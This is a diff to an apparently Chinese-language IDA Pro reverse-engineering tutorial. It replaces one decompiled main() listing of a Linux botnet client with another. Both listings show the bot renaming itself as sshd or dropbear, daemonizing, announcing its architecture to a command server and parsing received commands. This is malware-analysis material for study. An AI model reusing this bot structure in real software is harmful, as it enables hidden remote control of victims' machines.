@@ -19,148 +19,149 @@ IDA Pro 是一款功能強大的反組譯器和除錯器，廣泛用於軟體逆
 
 * 反編譯後的pseudocode 如下
 ```
-int __fastcall main(int argc, const char **argv, const char **envp)
+int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
 {
-  int v3; // ebx
-  unsigned int v4; // eax
-  int v5; // ebx
-  unsigned int v6; // eax
-  int Endianness; // ebx
-  int Build; // eax
-  int v9; // r8d
-  int v10; // r9d
-  int v11; // ebx
-  char v13[4096]; // [rsp+50h] [rbp-10D0h] BYREF
-  __int64 v14[11]; // [rsp+1050h] [rbp-D0h] BYREF
-  char v15[4]; // [rsp+10ACh] [rbp-74h] BYREF
-  void *v16; // [rsp+10B0h] [rbp-70h]
-  unsigned int v17; // [rsp+10B8h] [rbp-68h]
-  int v19; // [rsp+10C0h] [rbp-60h]
+  int v3; // edx
+  int v4; // ecx
+  int v5; // r8d
+  int v6; // r9d
+  int v7; // ebx
+  unsigned int v8; // eax
+  int v9; // ebx
+  unsigned int v10; // eax
+  int v11; // ecx
+  int v12; // r8d
+  int v13; // r9d
+  int v14; // ebx
+  char v15; // [rsp+0h] [rbp-1120h]
+  char v16[4096]; // [rsp+50h] [rbp-10D0h] BYREF
+  __int64 v17[10]; // [rsp+1050h] [rbp-D0h] BYREF
+  int v18; // [rsp+10A0h] [rbp-80h] BYREF
+  char v19[4]; // [rsp+10A4h] [rbp-7Ch] BYREF
+  const char *v20; // [rsp+10A8h] [rbp-78h]
+  unsigned int v21; // [rsp+10B0h] [rbp-70h]
+  __int64 v23; // [rsp+10B8h] [rbp-68h]
+  int v24; // [rsp+10C0h] [rbp-60h]
   int i; // [rsp+10C4h] [rbp-5Ch]
-  char *v21; // [rsp+10C8h] [rbp-58h]
-  __int64 v22; // [rsp+10D0h] [rbp-50h]
+  char *v26; // [rsp+10C8h] [rbp-58h]
+  __int64 v27; // [rsp+10D0h] [rbp-50h]
   unsigned int j; // [rsp+10DCh] [rbp-44h]
   const char *k; // [rsp+10E0h] [rbp-40h]
-  const char *v25; // [rsp+10E8h] [rbp-38h]
+  char *v30; // [rsp+10E8h] [rbp-38h]
   char *m; // [rsp+10F0h] [rbp-30h]
-  int v27; // [rsp+10FCh] [rbp-24h]
-  const char *v28; // [rsp+1100h] [rbp-20h]
+  int v32; // [rsp+10FCh] [rbp-24h]
+  const char *v33; // [rsp+1100h] [rbp-20h]
   int n; // [rsp+110Ch] [rbp-14h]
 
-  v16 = &unk_40F17D;
-  strncpy(*argv, &unk_40F17D, strlen(*argv));
-  *argv = (const char *)&unk_40F17D;
-  prctl(15LL, v16, 0LL, 0LL, 0LL);
-  v3 = time(0LL);
-  v4 = getpid();
-  srandom(v3 ^ v4);
-  v5 = time(0LL);
-  v6 = getpid();
-  init_rand(v5 ^ v6);
-  v17 = fork();
-  if ( v17 )
+  v20 = (const char *)&unk_412725;
+  if ( (unsigned int)access("/usr/bin/python", 0LL, envp) == -1 )
+    v20 = "/usr/sbin/dropbear";
+  else
+    v20 = "sshd";
+  if ( !(unsigned int)geteuid() )
+    userID = 0;
+  strncpy(*argv, &unk_412725, strlen(*argv));
+  sprintf((unsigned int)*argv, (_DWORD)v20, v3, v4, v5, v6);
+  prctl(15LL, v20, 0LL, 0LL, 0LL);
+  v7 = time(0LL);
+  v8 = getpid();
+  srandom(v7 ^ v8);
+  v9 = time(0LL);
+  v10 = getpid();
+  init_rand(v9 ^ v10);
+  getOurIP();
+  table_init();
+  v18 = 0;
+  table_unlock_val(1LL);
+  v23 = table_retrieve_val(1LL, &v18);
+  write(1LL, v23, v18);
+  write(1LL, "\n", 1LL);
+  table_lock_val(1LL);
+  watchdog_maintain();
+  v21 = fork();
+  if ( v21 )
   {
-    waitpid(v17, v15, 0LL);
+    waitpid(v21, v19, 0LL);
     exit(0);
   }
   if ( (unsigned int)fork() )
     exit(0);
-  chdir("/");
-  setuid(0);
-  seteuid(0);
-  signal(13LL, 1LL);
-  while ( !(unsigned int)fork() )
+  signal(13, 1LL);
+  while ( 1 )
   {
-    if ( !(unsigned int)initConnection() )
+    while ( (unsigned int)initConnection() )
+      sleep(5LL);
+    getBuild();
+    sockprintf(KHcommSOCK, (unsigned int)"arch %s", (unsigned int)"x86", v11, v12, v13, v15);
+    v24 = 0;
+    i = 0;
+    while ( 1 )
     {
-      Endianness = getEndianness();
-      Build = getBuild();
-      sockprintf(
-        mainCommSock,
-        (unsigned int)"[\x1B[96mBOT JOINED\x1B[97m] Arch: \x1B[96m%s \x1B[97m|| Type: %s]",
-        Build,
-        Endianness,
-        v9,
-        v10);
-      UpdateNameSrvs();
-      v19 = 0;
-      i = 0;
-      while ( 1 )
+      v24 = recvLine((unsigned int)KHcommSOCK, v16, 4096LL);
+      if ( v24 == -1 )
+        break;
+      for ( i = 0; i < (unsigned __int64)numpids; ++i )
       {
-        v19 = recvLine((unsigned int)mainCommSock, v13, 4096LL);
-        if ( v19 == -1 )
-          break;
-        for ( i = 0; i < (unsigned __int64)numpids; ++i )
+        if ( (int)waitpid(*(unsigned int *)(4LL * i + pids), 0LL, 1LL) > 0 )
         {
-          if ( (int)waitpid(*(unsigned int *)(4LL * i + pids), 0LL, 1LL) > 0 )
-          {
-            for ( j = i + 1; j < (unsigned __int64)numpids; ++j )
-              *(_DWORD *)(4LL * (j - 1) + pids) = *(_DWORD *)(4LL * j + pids);
-            *(_DWORD *)(4LL * (j - 1) + pids) = 0;
-            --numpids;
-            v22 = malloc(4 * numpids + 4);
-            for ( j = 0; j < (unsigned __int64)numpids; ++j )
-              *(_DWORD *)(v22 + 4LL * j) = *(_DWORD *)(4LL * j + pids);
-            free(pids);
-            pids = v22;
-          }
+          for ( j = i + 1; j < (unsigned __int64)numpids; ++j )
+            *(_DWORD *)(4LL * (j - 1) + pids) = *(_DWORD *)(4LL * j + pids);
+          *(_DWORD *)(4LL * (j - 1) + pids) = 0;
+          --numpids;
+          v27 = malloc(4 * numpids + 4);
+          for ( j = 0; j < (unsigned __int64)numpids; ++j )
+            *(_DWORD *)(v27 + 4LL * j) = *(_DWORD *)(4LL * j + pids);
+          free(pids);
+          pids = v27;
         }
-        v13[v19] = 0;
-        trim(v13);
-        if ( (char *)strstr(v13, "ICMP") != v13 )
+      }
+      v16[v24] = 0;
+      trim(v16);
+      v26 = v16;
+      if ( v16[0] == 46 )
+      {
+        for ( k = v26 + 1; *k != 32 && *k; ++k )
+          ;
+        if ( *k )
         {
-          if ( (char *)strstr(v13, "DUP") == v13 )
-            exit(0);
-          v21 = v13;
-          if ( v13[0] == 33 )
+          *k = 0;
+          k = v26 + 1;
+          for ( v26 += strlen(v26 + 1) + 2;
+                v26[strlen(v26) - 1] == 10 || v26[strlen(v26) - 1] == 13;
+                v26[strlen(v26) - 1] = 0 )
           {
-            for ( k = v21 + 1; *k != 32 && *k; ++k )
-              ;
-            if ( *k )
+            ;
+          }
+          v30 = v26;
+          while ( *v26 != 32 && *v26 )
+            ++v26;
+          *v26++ = 0;
+          for ( m = v30; *m; ++m )
+            *m = toupper((unsigned __int8)*m);
+          v32 = 1;
+          v33 = (const char *)strtok(v26, " ");
+          v17[0] = (__int64)v30;
+          while ( v33 )
+          {
+            if ( *v33 != 10 )
             {
-              *k = 0;
-              k = v21 + 1;
-              for ( v21 += strlen(v21 + 1) + 2;
-                    v21[strlen(v21) - 1] == 10 || v21[strlen(v21) - 1] == 13;
-                    v21[strlen(v21) - 1] = 0 )
-              {
-                ;
-              }
-              v25 = v21;
-              while ( *v21 != 32 && *v21 )
-                ++v21;
-              *v21++ = 0;
-              for ( m = (char *)v25; *m; ++m )
-                *m = toupper((unsigned __int8)*m);
-              v27 = 1;
-              v28 = (const char *)strtok(v21, " ");
-              v14[0] = (__int64)v25;
-              while ( v28 )
-              {
-                if ( *v28 != 10 )
-                {
-                  v11 = v27;
-                  v14[v11] = malloc(strlen(v28) + 1);
-                  memset((void *)v14[v27], 0, strlen(v28) + 1);
-                  strcpy(v14[v27++], v28);
-                }
-                v28 = (const char *)strtok(0LL, " ");
-              }
-              processCmd((unsigned int)v27, v14);
-              if ( v27 > 1 )
-              {
-                for ( n = 1; n < v27; ++n )
-                  free(v14[n]);
-              }
+              v14 = v32;
+              v17[v14] = malloc(strlen(v33) + 1);
+              memset((void *)v17[v32], 0, strlen(v33) + 1);
+              strcpy(v17[v32++], v33);
             }
+            v33 = (const char *)strtok(0LL, " ");
+          }
+          processCmd((unsigned int)v32, v17);
+          if ( v32 > 1 )
+          {
+            for ( n = 1; n < v32; ++n )
+              free(v17[n]);
           }
         }
       }
-      return 0;
     }
-    sleep(5LL);
   }
-  return 0;
 }
 ```
 
